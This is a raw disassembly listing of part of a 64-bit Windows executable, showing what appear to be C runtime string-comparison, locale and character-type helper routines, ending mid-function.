   14000b6a6:	c3                   	ret
   14000b6a7:	cc                   	int3
   14000b6a8:	48 83 ec 28          	sub    $0x28,%rsp
   14000b6ac:	83 3d c5 c9 00 00 00 	cmpl   $0x0,0xc9c5(%rip)        # 0x140018078
   14000b6b3:	75 36                	jne    0x14000b6eb
   14000b6b5:	48 85 c9             	test   %rcx,%rcx
   14000b6b8:	75 1a                	jne    0x14000b6d4
   14000b6ba:	e8 3d ac ff ff       	call   0x1400062fc
   14000b6bf:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b6c5:	e8 06 a2 ff ff       	call   0x1400058d0
   14000b6ca:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000b6cf:	48 83 c4 28          	add    $0x28,%rsp
   14000b6d3:	c3                   	ret
   14000b6d4:	48 85 d2             	test   %rdx,%rdx
   14000b6d7:	74 e1                	je     0x14000b6ba
   14000b6d9:	49 81 f8 ff ff ff 7f 	cmp    $0x7fffffff,%r8
   14000b6e0:	77 d8                	ja     0x14000b6ba
   14000b6e2:	48 83 c4 28          	add    $0x28,%rsp
   14000b6e6:	e9 bd 00 00 00       	jmp    0x14000b7a8
   14000b6eb:	45 33 c9             	xor    %r9d,%r9d
   14000b6ee:	48 83 c4 28          	add    $0x28,%rsp
   14000b6f2:	e9 01 00 00 00       	jmp    0x14000b6f8
   14000b6f7:	cc                   	int3
   14000b6f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b6fd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b702:	57                   	push   %rdi
   14000b703:	48 83 ec 40          	sub    $0x40,%rsp
   14000b707:	49 8b d8             	mov    %r8,%rbx
   14000b70a:	48 8b fa             	mov    %rdx,%rdi
   14000b70d:	48 8b f1             	mov    %rcx,%rsi
   14000b710:	48 85 c9             	test   %rcx,%rcx
   14000b713:	75 17                	jne    0x14000b72c
   14000b715:	e8 e2 ab ff ff       	call   0x1400062fc
   14000b71a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b720:	e8 ab a1 ff ff       	call   0x1400058d0
   14000b725:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   14000b72a:	eb 69                	jmp    0x14000b795
   14000b72c:	48 85 d2             	test   %rdx,%rdx
   14000b72f:	74 e4                	je     0x14000b715
   14000b731:	48 81 fb ff ff ff 7f 	cmp    $0x7fffffff,%rbx
   14000b738:	77 db                	ja     0x14000b715
   14000b73a:	48 85 db             	test   %rbx,%rbx
   14000b73d:	75 04                	jne    0x14000b743
   14000b73f:	33 c0                	xor    %eax,%eax
   14000b741:	eb 52                	jmp    0x14000b795
   14000b743:	49 8b d1             	mov    %r9,%rdx
   14000b746:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b74b:	e8 04 96 ff ff       	call   0x140004d54
   14000b750:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000b755:	4c 8b 80 10 01 00 00 	mov    0x110(%rax),%r8
   14000b75c:	0f b6 06             	movzbl (%rsi),%eax
   14000b75f:	48 ff c6             	inc    %rsi
   14000b762:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   14000b767:	0f b6 07             	movzbl (%rdi),%eax
   14000b76a:	48 ff c7             	inc    %rdi
   14000b76d:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   14000b772:	8b c2                	mov    %edx,%eax
   14000b774:	2b c1                	sub    %ecx,%eax
   14000b776:	75 0a                	jne    0x14000b782
   14000b778:	85 d2                	test   %edx,%edx
   14000b77a:	74 06                	je     0x14000b782
   14000b77c:	48 83 eb 01          	sub    $0x1,%rbx
   14000b780:	75 da                	jne    0x14000b75c
   14000b782:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000b787:	74 0c                	je     0x14000b795
   14000b789:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b78e:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b795:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000b79a:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000b79f:	48 83 c4 40          	add    $0x40,%rsp
   14000b7a3:	5f                   	pop    %rdi
   14000b7a4:	c3                   	ret
   14000b7a5:	cc                   	int3
   14000b7a6:	cc                   	int3
   14000b7a7:	cc                   	int3
   14000b7a8:	4c 8b da             	mov    %rdx,%r11
   14000b7ab:	4c 8b d1             	mov    %rcx,%r10
   14000b7ae:	4d 85 c0             	test   %r8,%r8
   14000b7b1:	75 03                	jne    0x14000b7b6
   14000b7b3:	33 c0                	xor    %eax,%eax
   14000b7b5:	c3                   	ret
   14000b7b6:	41 0f b6 0a          	movzbl (%r10),%ecx
   14000b7ba:	41 0f b6 13          	movzbl (%r11),%edx
   14000b7be:	8d 41 bf             	lea    -0x41(%rcx),%eax
   14000b7c1:	83 f8 19             	cmp    $0x19,%eax
   14000b7c4:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   14000b7c8:	8d 42 bf             	lea    -0x41(%rdx),%eax
   14000b7cb:	44 0f 47 c9          	cmova  %ecx,%r9d
   14000b7cf:	49 ff c2             	inc    %r10
   14000b7d2:	49 ff c3             	inc    %r11
   14000b7d5:	8d 4a 20             	lea    0x20(%rdx),%ecx
   14000b7d8:	83 f8 19             	cmp    $0x19,%eax
   14000b7db:	41 8b c1             	mov    %r9d,%eax
   14000b7de:	0f 47 ca             	cmova  %edx,%ecx
   14000b7e1:	2b c1                	sub    %ecx,%eax
   14000b7e3:	75 0b                	jne    0x14000b7f0
   14000b7e5:	45 85 c9             	test   %r9d,%r9d
   14000b7e8:	74 06                	je     0x14000b7f0
   14000b7ea:	49 83 e8 01          	sub    $0x1,%r8
   14000b7ee:	75 c6                	jne    0x14000b7b6
   14000b7f0:	c3                   	ret
   14000b7f1:	cc                   	int3
   14000b7f2:	cc                   	int3
   14000b7f3:	cc                   	int3
   14000b7f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b7f9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b7fe:	57                   	push   %rdi
   14000b7ff:	48 83 ec 60          	sub    $0x60,%rsp
   14000b803:	48 8b f2             	mov    %rdx,%rsi
   14000b806:	49 8b d9             	mov    %r9,%rbx
   14000b809:	48 8b d1             	mov    %rcx,%rdx
   14000b80c:	41 8b f8             	mov    %r8d,%edi
   14000b80f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000b814:	e8 3b 95 ff ff       	call   0x140004d54
   14000b819:	8b 84 24 a8 00 00 00 	mov    0xa8(%rsp),%eax
   14000b820:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000b825:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000b829:	4c 8b cb             	mov    %rbx,%r9
   14000b82c:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000b833:	44 8b c7             	mov    %edi,%r8d
   14000b836:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000b83a:	48 8b d6             	mov    %rsi,%rdx
   14000b83d:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   14000b844:	00 
   14000b845:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000b84a:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
   14000b851:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000b855:	e8 26 00 00 00       	call   0x14000b880
   14000b85a:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   14000b85f:	74 0c                	je     0x14000b86d
   14000b861:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000b866:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b86d:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000b872:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000b877:	48 83 c4 60          	add    $0x60,%rsp
   14000b87b:	5f                   	pop    %rdi
   14000b87c:	c3                   	ret
   14000b87d:	cc                   	int3
   14000b87e:	cc                   	int3
   14000b87f:	cc                   	int3
   14000b880:	40 55                	rex push %rbp
   14000b882:	53                   	push   %rbx
   14000b883:	56                   	push   %rsi
   14000b884:	57                   	push   %rdi
   14000b885:	41 54                	push   %r12
   14000b887:	41 55                	push   %r13
   14000b889:	41 56                	push   %r14
   14000b88b:	41 57                	push   %r15
   14000b88d:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   14000b894:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000b899:	48 8b 05 98 b7 00 00 	mov    0xb798(%rip),%rax        # 0x140017038
   14000b8a0:	48 33 c5             	xor    %rbp,%rax
   14000b8a3:	48 89 45 28          	mov    %rax,0x28(%rbp)
   14000b8a7:	48 63 9d a0 00 00 00 	movslq 0xa0(%rbp),%rbx
   14000b8ae:	45 33 e4             	xor    %r12d,%r12d
   14000b8b1:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   14000b8b8:	4d 8b f9             	mov    %r9,%r15
   14000b8bb:	44 89 45 00          	mov    %r8d,0x0(%rbp)
   14000b8bf:	48 8b f9             	mov    %rcx,%rdi
   14000b8c2:	48 89 55 08          	mov    %rdx,0x8(%rbp)
   14000b8c6:	85 db                	test   %ebx,%ebx
   14000b8c8:	7e 10                	jle    0x14000b8da
   14000b8ca:	48 8b d3             	mov    %rbx,%rdx
   14000b8cd:	49 8b c9             	mov    %r9,%rcx
   14000b8d0:	e8 3f fa ff ff       	call   0x14000b314
   14000b8d5:	48 8b d8             	mov    %rax,%rbx
   14000b8d8:	eb 09                	jmp    0x14000b8e3
   14000b8da:	83 fb ff             	cmp    $0xffffffff,%ebx
   14000b8dd:	0f 8c db 02 00 00    	jl     0x14000bbbe
   14000b8e3:	48 63 b5 b0 00 00 00 	movslq 0xb0(%rbp),%rsi
   14000b8ea:	85 f6                	test   %esi,%esi
   14000b8ec:	7e 10                	jle    0x14000b8fe
   14000b8ee:	48 8b d6             	mov    %rsi,%rdx
   14000b8f1:	49 8b cd             	mov    %r13,%rcx
   14000b8f4:	e8 1b fa ff ff       	call   0x14000b314
   14000b8f9:	48 8b f0             	mov    %rax,%rsi
   14000b8fc:	eb 09                	jmp    0x14000b907
   14000b8fe:	83 fe ff             	cmp    $0xffffffff,%esi
   14000b901:	0f 8c b7 02 00 00    	jl     0x14000bbbe
   14000b907:	44 8b b5 b8 00 00 00 	mov    0xb8(%rbp),%r14d
   14000b90e:	45 85 f6             	test   %r14d,%r14d
   14000b911:	75 07                	jne    0x14000b91a
   14000b913:	48 8b 07             	mov    (%rdi),%rax
   14000b916:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   14000b91a:	85 db                	test   %ebx,%ebx
   14000b91c:	74 08                	je     0x14000b926
   14000b91e:	85 f6                	test   %esi,%esi
   14000b920:	0f 85 a6 00 00 00    	jne    0x14000b9cc
   14000b926:	3b de                	cmp    %esi,%ebx
   14000b928:	0f 84 89 02 00 00    	je     0x14000bbb7
   14000b92e:	83 fe 01             	cmp    $0x1,%esi
   14000b931:	0f 8f 8b 00 00 00    	jg     0x14000b9c2
   14000b937:	83 fb 01             	cmp    $0x1,%ebx
   14000b93a:	7f 48                	jg     0x14000b984
   14000b93c:	48 8d 55 10          	lea    0x10(%rbp),%rdx
   14000b940:	41 8b ce             	mov    %r14d,%ecx
   14000b943:	ff 15 6f 9e 00 00    	call   *0x9e6f(%rip)        # 0x1400157b8
   14000b949:	85 c0                	test   %eax,%eax
   14000b94b:	0f 84 6d 02 00 00    	je     0x14000bbbe
   14000b951:	85 db                	test   %ebx,%ebx
   14000b953:	7e 39                	jle    0x14000b98e
   14000b955:	83 7d 10 02          	cmpl   $0x2,0x10(%rbp)
   14000b959:	72 29                	jb     0x14000b984
   14000b95b:	48 8d 45 16          	lea    0x16(%rbp),%rax
   14000b95f:	44 38 65 16          	cmp    %r12b,0x16(%rbp)
   14000b963:	74 1f                	je     0x14000b984
   14000b965:	44 38 60 01          	cmp    %r12b,0x1(%rax)
   14000b969:	74 19                	je     0x14000b984
   14000b96b:	41 8a 0f             	mov    (%r15),%cl
   14000b96e:	3a 08                	cmp    (%rax),%cl
   14000b970:	72 09                	jb     0x14000b97b
   14000b972:	3a 48 01             	cmp    0x1(%rax),%cl
   14000b975:	0f 86 3c 02 00 00    	jbe    0x14000bbb7
   14000b97b:	48 83 c0 02          	add    $0x2,%rax
   14000b97f:	44 38 20             	cmp    %r12b,(%rax)
   14000b982:	75 e1                	jne    0x14000b965
   14000b984:	b8 03 00 00 00       	mov    $0x3,%eax
   14000b989:	e9 32 02 00 00       	jmp    0x14000bbc0
   14000b98e:	85 f6                	test   %esi,%esi
   14000b990:	7e 3a                	jle    0x14000b9cc
   14000b992:	83 7d 10 02          	cmpl   $0x2,0x10(%rbp)
   14000b996:	72 2a                	jb     0x14000b9c2
   14000b998:	48 8d 45 16          	lea    0x16(%rbp),%rax
   14000b99c:	44 38 65 16          	cmp    %r12b,0x16(%rbp)
   14000b9a0:	74 20                	je     0x14000b9c2
   14000b9a2:	44 38 60 01          	cmp    %r12b,0x1(%rax)
   14000b9a6:	74 1a                	je     0x14000b9c2
   14000b9a8:	41 8a 4d 00          	mov    0x0(%r13),%cl
   14000b9ac:	3a 08                	cmp    (%rax),%cl
   14000b9ae:	72 09                	jb     0x14000b9b9
   14000b9b0:	3a 48 01             	cmp    0x1(%rax),%cl
   14000b9b3:	0f 86 fe 01 00 00    	jbe    0x14000bbb7
   14000b9b9:	48 83 c0 02          	add    $0x2,%rax
   14000b9bd:	44 38 20             	cmp    %r12b,(%rax)
   14000b9c0:	75 e0                	jne    0x14000b9a2
   14000b9c2:	b8 01 00 00 00       	mov    $0x1,%eax
   14000b9c7:	e9 f4 01 00 00       	jmp    0x14000bbc0
   14000b9cc:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000b9d1:	44 8b cb             	mov    %ebx,%r9d
   14000b9d4:	4d 8b c7             	mov    %r15,%r8
   14000b9d7:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   14000b9dc:	ba 09 00 00 00       	mov    $0x9,%edx
   14000b9e1:	41 8b ce             	mov    %r14d,%ecx
   14000b9e4:	e8 c3 af ff ff       	call   0x1400069ac
   14000b9e9:	4c 63 e0             	movslq %eax,%r12
   14000b9ec:	85 c0                	test   %eax,%eax
   14000b9ee:	0f 84 ca 01 00 00    	je     0x14000bbbe
   14000b9f4:	49 8b cc             	mov    %r12,%rcx
   14000b9f7:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   14000b9fe:	ff ff 0f 
   14000ba01:	48 03 c9             	add    %rcx,%rcx
   14000ba04:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   14000ba08:	48 3b ca             	cmp    %rdx,%rcx
   14000ba0b:	48 1b c9             	sbb    %rcx,%rcx
   14000ba0e:	48 23 ca             	and    %rdx,%rcx
   14000ba11:	74 50                	je     0x14000ba63
   14000ba13:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000ba1a:	77 2e                	ja     0x14000ba4a
   14000ba1c:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000ba20:	48 3b c1             	cmp    %rcx,%rax
   14000ba23:	77 03                	ja     0x14000ba28
   14000ba25:	49 8b c0             	mov    %r8,%rax
   14000ba28:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000ba2c:	e8 4f e9 ff ff       	call   0x14000a380
   14000ba31:	48 2b e0             	sub    %rax,%rsp
   14000ba34:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   14000ba39:	48 85 ff             	test   %rdi,%rdi
   14000ba3c:	0f 84 59 01 00 00    	je     0x14000bb9b
   14000ba42:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   14000ba48:	eb 13                	jmp    0x14000ba5d
   14000ba4a:	e8 41 ad ff ff       	call   0x140006790
   14000ba4f:	48 8b f8             	mov    %rax,%rdi
   14000ba52:	48 85 c0             	test   %rax,%rax
   14000ba55:	74 0e                	je     0x14000ba65
   14000ba57:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000ba5d:	48 83 c7 10          	add    $0x10,%rdi
   14000ba61:	eb 02                	jmp    0x14000ba65
   14000ba63:	33 ff                	xor    %edi,%edi
   14000ba65:	48 85 ff             	test   %rdi,%rdi
   14000ba68:	0f 84 2d 01 00 00    	je     0x14000bb9b
   14000ba6e:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   14000ba73:	44 8b cb             	mov    %ebx,%r9d
   14000ba76:	4d 8b c7             	mov    %r15,%r8
   14000ba79:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000ba7e:	ba 01 00 00 00       	mov    $0x1,%edx
   14000ba83:	41 8b ce             	mov    %r14d,%ecx
   14000ba86:	e8 21 af ff ff       	call   0x1400069ac
   14000ba8b:	85 c0                	test   %eax,%eax
   14000ba8d:	0f 84 08 01 00 00    	je     0x14000bb9b
   14000ba93:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000ba98:	44 8b ce             	mov    %esi,%r9d
   14000ba9b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000baa1:	4d 8b c5             	mov    %r13,%r8
   14000baa4:	ba 09 00 00 00       	mov    $0x9,%edx
   14000baa9:	41 8b ce             	mov    %r14d,%ecx
   14000baac:	e8 fb ae ff ff       	call   0x1400069ac
   14000bab1:	4c 63 f8             	movslq %eax,%r15
   14000bab4:	85 c0                	test   %eax,%eax
   14000bab6:	0f 84 df 00 00 00    	je     0x14000bb9b
   14000babc:	49 8b d7             	mov    %r15,%rdx
   14000babf:	48 03 d2             	add    %rdx,%rdx
   14000bac2:	48 8d 4a 10          	lea    0x10(%rdx),%rcx
   14000bac6:	48 3b d1             	cmp    %rcx,%rdx
   14000bac9:	48 1b d2             	sbb    %rdx,%rdx
   14000bacc:	48 23 d1             	and    %rcx,%rdx
   14000bacf:	74 56                	je     0x14000bb27
   14000bad1:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   14000bad8:	77 31                	ja     0x14000bb0b
   14000bada:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   14000bade:	48 3b c2             	cmp    %rdx,%rax
   14000bae1:	77 0a                	ja     0x14000baed
   14000bae3:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000baea:	ff ff 0f 
   14000baed:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000baf1:	e8 8a e8 ff ff       	call   0x14000a380
   14000baf6:	48 2b e0             	sub    %rax,%rsp
   14000baf9:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   14000bafe:	48 85 db             	test   %rbx,%rbx
   14000bb01:	74 7e                	je     0x14000bb81
   14000bb03:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000bb09:	eb 16                	jmp    0x14000bb21
   14000bb0b:	48 8b ca             	mov    %rdx,%rcx
   14000bb0e:	e8 7d ac ff ff       	call   0x140006790
   14000bb13:	48 8b d8             	mov    %rax,%rbx
   14000bb16:	48 85 c0             	test   %rax,%rax
   14000bb19:	74 0e                	je     0x14000bb29
   14000bb1b:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000bb21:	48 83 c3 10          	add    $0x10,%rbx
   14000bb25:	eb 02                	jmp    0x14000bb29
   14000bb27:	33 db                	xor    %ebx,%ebx
   14000bb29:	48 85 db             	test   %rbx,%rbx
   14000bb2c:	74 53                	je     0x14000bb81
   14000bb2e:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000bb33:	44 8b ce             	mov    %esi,%r9d
   14000bb36:	4d 8b c5             	mov    %r13,%r8
   14000bb39:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bb3e:	ba 01 00 00 00       	mov    $0x1,%edx
   14000bb43:	41 8b ce             	mov    %r14d,%ecx
   14000bb46:	e8 61 ae ff ff       	call   0x1400069ac
   14000bb4b:	85 c0                	test   %eax,%eax
   14000bb4d:	74 32                	je     0x14000bb81
   14000bb4f:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000bb55:	45 8b cc             	mov    %r12d,%r9d
   14000bb58:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000bb5e:	4c 8b c7             	mov    %rdi,%r8
   14000bb61:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000bb67:	8b 55 00             	mov    0x0(%rbp),%edx
   14000bb6a:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000bb6e:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000bb73:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000bb78:	e8 23 82 ff ff       	call   0x140003da0
   14000bb7d:	8b f0                	mov    %eax,%esi
   14000bb7f:	eb 02                	jmp    0x14000bb83
   14000bb81:	33 f6                	xor    %esi,%esi
   14000bb83:	48 85 db             	test   %rbx,%rbx
   14000bb86:	74 15                	je     0x14000bb9d
   14000bb88:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000bb8c:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bb92:	75 09                	jne    0x14000bb9d
   14000bb94:	e8 3b 9c ff ff       	call   0x1400057d4
   14000bb99:	eb 02                	jmp    0x14000bb9d
   14000bb9b:	33 f6                	xor    %esi,%esi
   14000bb9d:	48 85 ff             	test   %rdi,%rdi
   14000bba0:	74 11                	je     0x14000bbb3
   14000bba2:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   14000bba6:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000bbac:	75 05                	jne    0x14000bbb3
   14000bbae:	e8 21 9c ff ff       	call   0x1400057d4
   14000bbb3:	8b c6                	mov    %esi,%eax
   14000bbb5:	eb 09                	jmp    0x14000bbc0
   14000bbb7:	b8 02 00 00 00       	mov    $0x2,%eax
   14000bbbc:	eb 02                	jmp    0x14000bbc0
   14000bbbe:	33 c0                	xor    %eax,%eax
   14000bbc0:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000bbc4:	48 33 cd             	xor    %rbp,%rcx
   14000bbc7:	e8 54 57 ff ff       	call   0x140001320
   14000bbcc:	48 8d 65 38          	lea    0x38(%rbp),%rsp
   14000bbd0:	41 5f                	pop    %r15
   14000bbd2:	41 5e                	pop    %r14
   14000bbd4:	41 5d                	pop    %r13
   14000bbd6:	41 5c                	pop    %r12
   14000bbd8:	5f                   	pop    %rdi
   14000bbd9:	5e                   	pop    %rsi
   14000bbda:	5b                   	pop    %rbx
   14000bbdb:	5d                   	pop    %rbp
   14000bbdc:	c3                   	ret
   14000bbdd:	cc                   	int3
   14000bbde:	cc                   	int3
   14000bbdf:	cc                   	int3
   14000bbe0:	40 53                	rex push %rbx
   14000bbe2:	48 83 ec 40          	sub    $0x40,%rsp
   14000bbe6:	48 63 d9             	movslq %ecx,%rbx
   14000bbe9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000bbee:	e8 61 91 ff ff       	call   0x140004d54
   14000bbf3:	8d 43 01             	lea    0x1(%rbx),%eax
   14000bbf6:	3d 00 01 00 00       	cmp    $0x100,%eax
   14000bbfb:	77 13                	ja     0x14000bc10
   14000bbfd:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000bc02:	48 8b 08             	mov    (%rax),%rcx
   14000bc05:	0f b7 04 59          	movzwl (%rcx,%rbx,2),%eax
   14000bc09:	25 00 80 00 00       	and    $0x8000,%eax
   14000bc0e:	eb 02                	jmp    0x14000bc12
   14000bc10:	33 c0                	xor    %eax,%eax
   14000bc12:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000bc17:	74 0c                	je     0x14000bc25
   14000bc19:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000bc1e:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000bc25:	48 83 c4 40          	add    $0x40,%rsp
   14000bc29:	5b                   	pop    %rbx
   14000bc2a:	c3                   	ret
   14000bc2b:	cc                   	int3
   14000bc2c:	cc                   	int3
   14000bc2d:	cc                   	int3
   14000bc2e:	cc                   	int3
   14000bc2f:	cc                   	int3
   14000bc30:	cc                   	int3
   14000bc31:	cc                   	int3
   14000bc32:	cc                   	int3
   14000bc33:	cc                   	int3
   14000bc34:	cc                   	int3
   14000bc35:	cc                   	int3
   14000bc36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000bc3d:	00 00 00 
   14000bc40:	48 83 ec 28          	sub    $0x28,%rsp
   14000bc44:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000bc49:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000bc4e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   14000bc53:	48 8b 12             	mov    (%rdx),%rdx
   14000bc56:	48 8b c1             	mov    %rcx,%rax
   14000bc59:	e8 82 7d ff ff       	call   0x1400039e0
   14000bc5e:	ff d0                	call   *%rax
   14000bc60:	e8 ab 7d ff ff       	call   0x140003a10
   14000bc65:	48 8b c8             	mov    %rax,%rcx
   14000bc68:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000bc6d:	48 8b 12             	mov    (%rdx),%rdx
   14000bc70:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000bc76:	e8 65 7d ff ff       	call   0x1400039e0
   14000bc7b:	48 83 c4 28          	add    $0x28,%rsp
   14000bc7f:	c3                   	ret
   14000bc80:	cc                   	int3
   14000bc81:	cc                   	int3
   14000bc82:	cc                   	int3
   14000bc83:	cc                   	int3
   14000bc84:	cc                   	int3
   14000bc85:	cc                   	int3
   14000bc86:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000bc8d:	00 00 00 
   14000bc90:	48 83 ec 28          	sub    $0x28,%rsp
   14000bc94:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000bc99:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000bc9e:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   14000bca3:	48 8b 12             	mov    (%rdx),%rdx
   14000bca6:	48 8b c1             	mov    %rcx,%rax
   14000bca9:	e8 32 7d ff ff       	call   0x1400039e0
   14000bcae:	ff d0                	call   *%rax
   14000bcb0:	e8 5b 7d ff ff       	call   0x140003a10
   14000bcb5:	48 83 c4 28          	add    $0x28,%rsp
   14000bcb9:	c3                   	ret
   14000bcba:	cc                   	int3
   14000bcbb:	cc                   	int3
   14000bcbc:	cc                   	int3
   14000bcbd:	cc                   	int3
   14000bcbe:	cc                   	int3
   14000bcbf:	cc                   	int3
   14000bcc0:	48 83 ec 28          	sub    $0x28,%rsp
   14000bcc4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000bcc9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000bcce:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000bcd3:	48 8b 12             	mov    (%rdx),%rdx
   14000bcd6:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000bcdc:	e8 ff 7c ff ff       	call   0x1400039e0
   14000bce1:	48 83 c4 28          	add    $0x28,%rsp
   14000bce5:	c3                   	ret
   14000bce6:	cc                   	int3
   14000bce7:	cc                   	int3
   14000bce8:	cc                   	int3
   14000bce9:	cc                   	int3
   14000bcea:	cc                   	int3
   14000bceb:	cc                   	int3
   14000bcec:	0f 1f 40 00          	nopl   0x0(%rax)
   14000bcf0:	48 83 ec 28          	sub    $0x28,%rsp
   14000bcf4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000bcf9:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   14000bcfe:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000bd03:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   14000bd08:	45 8b c1             	mov    %r9d,%r8d
   14000bd0b:	48 8b c1             	mov    %rcx,%rax
   14000bd0e:	e8 cd 7c ff ff       	call   0x1400039e0
   14000bd13:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   14000bd18:	ff d0                	call   *%rax
   14000bd1a:	e8 f1 7c ff ff       	call   0x140003a10
   14000bd1f:	48 8b c8             	mov    %rax,%rcx
   14000bd22:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   14000bd27:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000bd2d:	e8 ae 7c ff ff       	call   0x1400039e0
   14000bd32:	48 83 c4 28          	add    $0x28,%rsp
   14000bd36:	c3                   	ret
   14000bd37:	cc                   	int3
   14000bd38:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000bd3d:	55                   	push   %rbp
   14000bd3e:	56                   	push   %rsi
   14000bd3f:	57                   	push   %rdi
   14000bd40:	41 56                	push   %r14
   14000bd42:	41 57                	push   %r15
   14000bd44:	48 83 ec 40          	sub    $0x40,%rsp
   14000bd48:	48 8b 05 e9 b2 00 00 	mov    0xb2e9(%rip),%rax        # 0x140017038
   14000bd4f:	48 33 c4             	xor    %rsp,%rax
   14000bd52:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000bd57:	45 33 d2             	xor    %r10d,%r10d
   14000bd5a:	4c 8d 1d 6f ce 00 00 	lea    0xce6f(%rip),%r11        # 0x140018bd0
   14000bd61:	4d 85 c9             	test   %r9,%r9
   14000bd64:	48 8d 3d 75 6f 00 00 	lea    0x6f75(%rip),%rdi        # 0x140012ce0
   14000bd6b:	48 8b c2             	mov    %rdx,%rax
